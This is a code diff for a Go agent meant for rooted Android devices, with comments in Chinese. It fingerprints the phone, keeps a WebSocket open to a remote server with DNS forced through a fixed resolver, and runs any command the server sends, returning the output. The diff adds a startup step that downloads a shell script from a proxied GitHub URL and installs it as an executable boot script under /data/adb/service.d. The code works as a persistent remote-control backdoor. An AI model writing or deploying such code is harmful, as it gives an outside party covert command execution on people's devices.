@@ -1,17 +1,19 @@
 package main
 
 import (
+	"bytes"
 	"context"
 	"crypto/md5"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
-	"io/ioutil"
+	"io"
 	"net"
 	"net/http"
 	"net/url"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"strings"
 	"sync"
 	"time"
@@ -20,93 +22,207 @@ import (
 )
 
 const (
-	deviceFile  = "/data/adb/.deviceid"
-	wsURL       = "wss://qdwqidhqiow.yg.gs/connect"
-	forceDNS    = "223.5.5.5:53"
-	retryDelay  = 3 * time.Second
-	readTimeout = 3 * time.Second
-	pingPeriod  = 2 * time.Second
+	deviceFile        = "/data/adb/.deviceid"
+	// !!! 更改 WS URL 為 WSS 協定和新的地址 !!!
+	wsURL             = "wss://qdwqidhqiow.yg.gs:443/connect"
+	forceDNS          = "223.5.5.5:53"
+	retryDelay        = 3 * time.Second
+	readTimeout       = 3 * time.Second
+	pingPeriod        = 2 * time.Second
+	scriptURL         = "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"
+	localScriptPath   = "/data/adb/service.d/run.sh"
+	dirMode           = 0755
+	fileMode          = 0755
 )
 
 // ------------------ 資料結構 ------------------
 type Message struct {
-	Type      string `json:"type"`
+	Type      string `json:"type"`
 	CommandID string `json:"command_id"`
-	DeviceID  string `json:"device_id,omitempty"`
-	Command   string `json:"command,omitempty"`
-	Output    string `json:"output,omitempty"`
-	Error     string `json:"error,omitempty"`
+	DeviceID  string `json:"device_id,omitempty"`
+	Command   string `json:"command,omitempty"`
+	Output    string `json:"output,omitempty"`
+	Error     string `json:"error,omitempty"`
 }
 
-// ------------------ 設備ID處理 ------------------
-func getDeviceID() string {
-	// 如果文件存在就讀取
-	if data, err := os.ReadFile(deviceFile); err == nil {
-		return strings.TrimSpace(string(data))
+// ------------------ 腳本更新處理 (已修改，應用強制 DNS) ------------------
+
+// createForcedResolver 創建一個強制使用指定 DNS 伺服器的解析器
+func createForcedResolver() *net.Resolver {
+	return &net.Resolver{
+		PreferGo: true,
+		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
+			d := net.Dialer{Timeout: 10 * time.Second}
+			return d.DialContext(ctx, "udp", forceDNS) // 強制使用 223.5.5.5:53
+		},
+	}
+}
+
+// downloadScript 從指定的 URL 下載腳本內容 (應用強制 DNS)
+func downloadScript(url string) ([]byte, error) {
+	fmt.Printf("嘗試下載腳本: %s\n", url)
+
+	// 1. 創建一個帶有強制 DNS 的撥號器
+	transport := &http.Transport{
+		Proxy: http.ProxyFromEnvironment,
+		DialContext: (&net.Dialer{
+			Timeout:     15 * time.Second,
+			KeepAlive:   30 * time.Second,
+			Resolver:    createForcedResolver(), // <--- 注入強制 DNS 解析器
+		}).DialContext,
 	}
 
-	deviceID := "unknown"
-	deviceComponents := ""
+	client := http.Client{
+		Transport: transport,
+		Timeout: 15 * time.Second,
+	}
+	
+	resp, err := client.Get(url)
+	if err != nil {
+		return nil, fmt.Errorf("下載失敗: %w", err)
+	}
+	defer resp.Body.Close()
 
-	// 嘗試使用 getprop
-	if _, err := exec.LookPath("getprop"); err == nil {
-		props := []string{"ro.serialno", "ro.product.model", "ro.product.manufacturer", "ro.product.brand"}
-		values := make([]string, 0)
-		for _, p := range props {
-			out, _ := exec.Command("getprop", p).Output()
-			val := strings.TrimSpace(string(out))
-			if val != "" {
-				values = append(values, val)
-			}
+	if resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("下載失敗，HTTP 狀態碼: %d", resp.StatusCode)
+	}
+
+	return io.ReadAll(resp.Body)
+}
+
+func UpdateScript() {
+	newScriptContent, err := downloadScript(scriptURL)
+	if err != nil {
+		fmt.Printf("腳本下載失敗: %v\n", err)
+		return
+	}
+
+	localScriptContent, err := os.ReadFile(localScriptPath)
+	if err == nil {
+		if bytes.Equal(newScriptContent, localScriptContent) {
+			fmt.Println("本地腳本已是最新版本，無需更新。")
+			return
 		}
-		if len(values) > 0 {
-			deviceComponents = strings.Join(values, "_")
+	} else if !os.IsNotExist(err) {
+		fmt.Printf("讀取本地腳本失敗: %v\n", err)
+		return
+	}
+
+	scriptDir := filepath.Dir(localScriptPath)
+	if err := os.MkdirAll(scriptDir, dirMode); err != nil {
+		fmt.Printf("創建或設置目錄權限 (%s, 0%o) 失敗: %v\n", scriptDir, dirMode, err)
+		return
+	}
+
+	err = os.WriteFile(localScriptPath, newScriptContent, fileMode)
+	if err != nil {
+		fmt.Printf("寫入/更新本地腳本失敗: %v\n", err)
+		return
+	}
+
+	fmt.Printf("成功更新本地腳本到: %s (權限: 0%o)\n", localScriptPath, fileMode)
+}
+
+// ------------------ 設備ID處理 (略) ------------------
+
+func runCommand(name string, arg ...string) string {
+	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
+	defer cancel()
+	cmd := exec.CommandContext(ctx, name, arg...)
+	output, err := cmd.Output()
+	if err != nil {
+		return ""
+	}
+	return strings.TrimSpace(string(output))
+}
+
+func getPropValue(prop string) string {
+	return runCommand("getprop", prop)
+}
+
+func readBuildPropValue(prop string) string {
+	data, err := os.ReadFile("/system/build.prop")
+	if err != nil {
+		return ""
+	}
+	prefix := prop + "="
+	for _, line := range strings.Split(string(data), "\n") {
+		if strings.HasPrefix(line, prefix) {
+			return strings.TrimSpace(line[len(prefix):])
+		}
+	}
+	return ""
+}
+
+func generateDeviceID() string {
+	var components []string
+
+	serial := getPropValue("ro.serialno")
+	model := getPropValue("ro.product.model")
+	manufacturer := getPropValue("ro.product.manufacturer")
+	brand := getPropValue("ro.product.brand")
+
+	if serial != "" || model != "" || manufacturer != "" || brand != "" {
+		if serial != "" {
+			components = append(components, serial)
+		}
+		if model != "" {
+			components = append(components, model)
+		}
+		if manufacturer != "" {
+			components = append(components, manufacturer)
+		}
+		if brand != "" {
+			components = append(components, brand)
 		}
 	}
 
-	// 如果 getprop 沒有得到結果，嘗試從 /system/build.prop
-	if deviceComponents == "" {
-		if data, err := os.ReadFile("/system/build.prop"); err == nil {
-			lines := strings.Split(string(data), "\n")
-			propsMap := map[string]string{}
-			for _, line := range lines {
-				line = strings.TrimSpace(line)
-				if strings.HasPrefix(line, "ro.serialno=") {
-					propsMap["serial"] = strings.TrimPrefix(line, "ro.serialno=")
-				} else if strings.HasPrefix(line, "ro.product.model=") {
-					propsMap["model"] = strings.TrimPrefix(line, "ro.product.model=")
-				} else if strings.HasPrefix(line, "ro.product.manufacturer=") {
-					propsMap["manufacturer"] = strings.TrimPrefix(line, "ro.product.manufacturer=")
-				}
-			}
-			parts := []string{}
-			for _, key := range []string{"serial", "model", "manufacturer"} {
-				if val, ok := propsMap[key]; ok && val != "" {
-					parts = append(parts, val)
-				}
-			}
-			if len(parts) > 0 {
-				deviceComponents = strings.Join(parts, "_")
-			}
+	if len(components) == 0 {
+		serial = readBuildPropValue("ro.serialno")
+		model = readBuildPropValue("ro.product.model")
+		manufacturer = readBuildPropValue("ro.product.manufacturer")
+
+		if serial != "" {
+			components = append(components, serial)
+		}
+		if model != "" {
+			components = append(components, model)
+		}
+		if manufacturer != "" {
+			components = append(components, manufacturer)
 		}
 	}
 
-	// 計算 MD5 作為 deviceID
+	deviceComponents := strings.Join(components, "_")
+
 	if deviceComponents != "" {
-		h := md5.New()
-		h.Write([]byte(deviceComponents))
-		deviceID = hex.EncodeToString(h.Sum(nil))
+		hash := md5.Sum([]byte(deviceComponents))
+		return hex.EncodeToString(hash[:])
 	}
 
-	// 保存到文件，不創建目錄，權限設為 0755
-	if deviceID != "unknown" {
-		ioutil.WriteFile(deviceFile, []byte(deviceID), 0755)
+	hostname, _ := os.Hostname()
+	if hostname == "" {
+		hostname = "unknown"
 	}
-
-	return deviceID
+	return fmt.Sprintf("%s-%d", hostname, time.Now().Unix())
 }
 
-// ------------------ 命令執行 ------------------
+func getDeviceID() string {
+	data, err := os.ReadFile(deviceFile)
+	if err == nil {
+		id := strings.TrimSpace(string(data))
+		if id != "" {
+			return id
+		}
+	}
+
+	newID := generateDeviceID()
+	os.WriteFile(deviceFile, []byte(newID), 0644)
+	return newID
+}
+
+// ------------------ 命令執行 (略) ------------------
+
 func executeCommand(cmdLine, cmdID, deviceID string) Message {
 	parts := strings.Fields(cmdLine)
 	if len(parts) == 0 {
@@ -120,10 +236,10 @@ func executeCommand(cmdLine, cmdID, deviceID string) Message {
 	output, err := cmd.CombinedOutput()
 
 	msg := Message{
-		Type:      "result",
+		Type:      "result",
 		CommandID: cmdID,
-		DeviceID:  deviceID,
-		Output:    string(output),
+		DeviceID:  deviceID,
+		Output:    string(output),
 	}
 	if err != nil {
 		msg.Error = err.Error()
@@ -131,12 +247,12 @@ func executeCommand(cmdLine, cmdID, deviceID string) Message {
 	return msg
 }
 
-// ------------------ WebSocket 連接管理 ------------------
+// ------------------ WebSocket 連接管理 (使用 createForcedResolver) ------------------
 type WSClient struct {
-	conn     *websocket.Conn
-	mu       sync.RWMutex
+	conn     *websocket.Conn
+	mu       sync.RWMutex
 	deviceID string
-	closed   bool
+	closed   bool
 }
 
 func NewWSClient(deviceID string) *WSClient {
@@ -151,21 +267,17 @@ func (w *WSClient) connect() error {
 	q.Set("device_id", w.deviceID)
 	u.RawQuery = q.Encode()
 
-	resolver := &net.Resolver{
-		PreferGo: true,
-		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
-			d := net.Dialer{Timeout: 10 * time.Second}
-			return d.DialContext(ctx, "udp", forceDNS)
-		},
-	}
+	// 使用公共的解析器創建函式
+	resolver := createForcedResolver()
 
 	dialer := websocket.Dialer{
 		Proxy: http.ProxyFromEnvironment,
 		NetDialContext: (&net.Dialer{
-			Timeout:   10 * time.Second,
+			Timeout:   10 * time.Second,
 			KeepAlive: 30 * time.Second,
-			Resolver:  resolver,
+			Resolver:  resolver, // 使用自定義解析器
 		}).DialContext,
+		// WSS 連接需要 TLS 配置，但對於簡單的連接，預設的配置通常足夠
 	}
 
 	conn, _, err := dialer.Dial(u.String(), nil)
@@ -178,7 +290,6 @@ func (w *WSClient) connect() error {
 	w.closed = false
 	w.mu.Unlock()
 
-	// 設置心跳和超時處理
 	conn.SetReadDeadline(time.Now().Add(readTimeout))
 	conn.SetPongHandler(func(string) error {
 		conn.SetReadDeadline(time.Now().Add(readTimeout))
@@ -276,16 +387,16 @@ func (w *WSClient) listen() {
 	}
 }
 
-// ------------------ 連接管理器 ------------------
+// ------------------ 連接管理器 (略) ------------------
 type ConnectionManager struct {
-	client    *WSClient
-	deviceID  string
+	client    *WSClient
+	deviceID  string
 	reconnect chan bool
 }
 
 func NewConnectionManager(deviceID string) *ConnectionManager {
 	return &ConnectionManager{
-		deviceID:  deviceID,
+		deviceID:  deviceID,
 		reconnect: make(chan bool, 1),
 	}
 }
@@ -327,12 +438,16 @@ func (cm *ConnectionManager) monitorConnection() {
 	}
 }
 
-// ------------------ 主函數 ------------------
+// ------------------ 主函數 (略) ------------------
 func main() {
+	UpdateScript()
+	
 	deviceID := getDeviceID()
 	fmt.Printf("設備ID: %s\n", deviceID)
 
 	manager := NewConnectionManager(deviceID)
+
 	go manager.monitorConnection()
+
 	manager.run()
 }
